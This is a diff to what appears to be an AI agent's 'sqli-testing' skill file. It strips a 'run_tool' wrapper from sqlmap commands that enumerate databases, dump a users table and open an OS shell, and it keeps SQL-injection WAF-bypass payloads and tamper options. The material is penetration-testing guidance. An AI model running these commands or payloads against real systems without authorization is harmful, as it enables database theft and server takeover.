@@ -1,7 +1,7 @@
 ---
 name: sqli-testing
 description: Detect and exploit SQL injection vulnerabilities in web application parameters
-origin: RedteamOpencode
+origin: AI Threat Hunting
 ---
 
 # SQL Injection Testing
@@ -87,13 +87,13 @@ Version: `SELECT version()` (MySQL/PG), `SELECT @@version` (MySQL/MSSQL), `SELEC
 
 ## sqlmap
 ```bash
-run_tool sqlmap -u "http://target/page?id=1" --batch --dbs --level 3 --risk 2
-run_tool sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs
+sqlmap -u "http://target/page?id=1" --batch --dbs --level 3 --risk 2
+sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs
 # Default current-engagement auth should come from auth.json; only pass --cookie or headers explicitly for override tests.
-run_tool sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
-run_tool sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
-run_tool sqlmap -r /engagement/scans/request.txt --batch --dbs --level 3 --risk 2
-run_tool sqlmap -u "http://target/page?id=1" --os-shell --batch
+sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
+sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
+sqlmap -r /engagement/scans/request.txt --batch --dbs --level 3 --risk 2
+sqlmap -u "http://target/page?id=1" --os-shell --batch
 ```
 
 ## WAF Bypass
@@ -103,5 +103,5 @@ run_tool sqlmap -u "http://target/page?id=1" --os-shell --batch
 UN/**/ION SE/**/LECT NULL,version(),NULL--   # Comment insertion
 /*!50000UNION*/ /*!50000SELECT*/             # MySQL inline comments
 '%09OR%091=1--                               # Whitespace alternatives
-run_tool sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch --dbs
+sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch --dbs
 ```
